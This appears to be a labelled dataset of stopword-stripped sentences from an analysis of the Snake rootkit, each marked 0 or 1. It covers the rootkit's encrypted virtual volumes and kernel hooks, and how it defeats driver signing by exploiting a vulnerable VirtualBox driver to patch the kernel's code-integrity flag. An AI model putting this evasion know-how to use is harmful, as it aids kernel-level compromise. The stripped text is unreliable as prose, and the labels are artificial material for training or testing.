For example message headers could Once received pipes unwrapped/decoded data handled usermode DLL per data intention - whether 's traffic sniffing task peer-2-peer client logic logging task task saving received files virtual volumes	1
The driver creates virtual file volumes encrypted storage files configuration data The volumes mounted virtual file systems RawDisk1 RawDisk2	1
The first partition created following steps The hook installed rootkit IofCallDriver ( ) API provides on-the-fly data encryption/decryption whenever data written read volume	1
The encryption algorithm based CAST-128 hard-coded key stored rootkit body	1
As result whenever data saved volume Hd1 scrambled on-the-fly reflected persistent storage file hotfix.dat physically located within rootkit 's 'home ' directory Analysis hotfix.dat file contents reveals 's fully encrypted file flat entropy	1
Thus possible reveal contents Snake 's volume accessing contents file ( unless encryption broken )	0
Enlisting contents created volume possible along creating files However soon IofCallDriver ( ) hook removed 'dir ' command fail hook rootkit decrypt scrambled volume The second volume \\.\Hd2 mapped file computer switched contents lost	0
Thus could used temporary cache storage	0
The data stored \\.\Hd2 encrypted way first volume 's data	1
Both volumes appear set FAT volumes	1
An attempt read data volumes code This produce following results For \\.\Hd1 For \\.\Hd2 The ability keep data TrueCrypt-like volumes provides Snake powerful ability exchange data usermode DLL volumes accessible usermode kernel mode	1
Static analysis code reveals Snake driver uses virtual volumes store data additional files	1
For example stores message queue file called The message queue indicates asynchronous communication model kernel mode driver usermode DLL e.g	1
pass commands configuration parameters binary images additional Snake components	0
Other files may also found virtual volume klog conlog dump rknginst.exe rknginst.exe could name original dropper log files could potentially contain executed command outputs intercepted keystrokes output logs	1
The 64-bit version Snake must deal number additional security protections implemented 64-bit editions Microsoft Windows significant kernel driver signature validation Kernel Patch Protection ( commonly known PatchGuard )	0
PatchGuard feature 64-bit Windows aims prevent modification Windows kernel something often performed malware attempting hide infected system	0
Although PatchGuard successful preventing kernel patching initialised several published bypass approaches exist	0
The technique used Snake appears similar approaches	0
The driver signing policy enforced 64-bit versions Windows Vista onwards requires kernel-mode drivers signed valid digital signature	0
The Snake dropper contains 32-bit 64-bit unsigned drivers successfully load unsigned 64-bit driver 64-bit version Windows XP – driver signing enforced resort tricks OS version	1
In case order ensure driver loaded automatically startup dropper install 64-bit driver 64-bit Windows XP way installs 32-bit driver 32-bit version Windows XP	1
On 64-bit versions Windows Vista behaves differently	1
Firstly 64-bit unsigned driver file created usual However driver registered ; registered instead dropper	1
To dropper first copies The dropper registers service ensure starts every time Windows booted creating values Now comes interesting part dropper manage load 64-bit unsigned driver 64-bit versions Windows Vista later versions 64-bit Windows 7/8 ? The answer Yes	1
Does resort using bootkit technology used past bypass protections load unsigned 64-bit drivers ? The answer No	0
Bootkits must overwrite Master Boot Record ( MBR ) antivirus products well trained catch kind bad behavior	0
The masterminds behind Snake rootkit seem well aware resorted instead leveraging vulnerability well-known virtualization product called VirtualBox product made Oracle widely used researchers analyse malware	0
VirtualBox driver version 1.6.2 released June 2 2008	0
Two months later August 2008 security researchers reported main driver component signed entity '' innotek Gmbh '' contained privilege escalation vulnerability	0
In nutshell VirtualBox software installs driver called VBoxDrv	0
The driver controlled Input/Ouput Control Codes ( 32-bit values called IOCTL ) passed along DeviceIoControl ( ) API	0
One documented transfer methods system uses pass data caller DeviceIoControl ( ) API driver called METHODNEITHER	0
As per MSDN documentation METHODNEITHER special transfer type Input/Output Request Packet ( IRP ) supplies user-mode virtual addresses input output buffers without validating mapping	0
It responsibility driver validate addresses sent user mode order make sure addresses valid usermode addresses	0
The source code vulnerable driver ( shown ) demonstrates integer value rc variable first derived input parameters pDevObj ( device object ) pIrp ( request packet )	0
Next integer value written UserBuffer - arbitrary address pointed input parameter pIrp ( request packet )	0
As validations made UserBuffer attacker craft input parameters define address within kernel memory patch data patch Now vulnerable driver used weapon patch kernel memory malware needs patch content variable nt gCiEnabled boolean variable '' Code Integrity Enabled '' marks whether system booted WinPE mode	1
